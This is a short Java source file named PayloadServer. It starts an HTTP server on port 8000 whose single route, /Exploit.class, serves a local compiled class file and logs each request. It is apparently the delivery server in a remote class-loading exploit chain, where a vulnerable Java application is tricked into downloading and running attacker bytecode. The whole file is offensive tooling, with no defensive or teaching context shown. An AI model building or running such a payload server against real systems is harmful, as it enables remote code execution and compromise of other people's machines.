import com.sun.net.httpserver.HttpServer;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.logging.Logger;
import java.util.logging.Level;

public class PayloadServer {
    private static final Logger logger = Logger.getLogger(PayloadServer.class.getName());
    private static final int PORT = 8000;

    public static void main(String[] args) throws IOException {
        HttpServer server = HttpServer.create(new InetSocketAddress(PORT), 0);

        server.createContext("/Exploit.class", exchange -> {
            logger.info("Received request for Exploit.class");
            try {
                byte[] response = Files.readAllBytes(Paths.get("Exploit.class"));
                exchange.sendResponseHeaders(200, response.length);
                try (OutputStream os = exchange.getResponseBody()) {
                    os.write(response);
                }
                logger.info("Successfully served Exploit.class (" + response.length + " bytes)");
            } catch (IOException e) {
                logger.log(Level.SEVERE, "Error serving Exploit.class", e);
                exchange.sendResponseHeaders(500, 0);
                exchange.close();
            }
        });

        server.setExecutor(null);
        logger.info("Starting payload server on port " + PORT);
        server.start();
    }
} 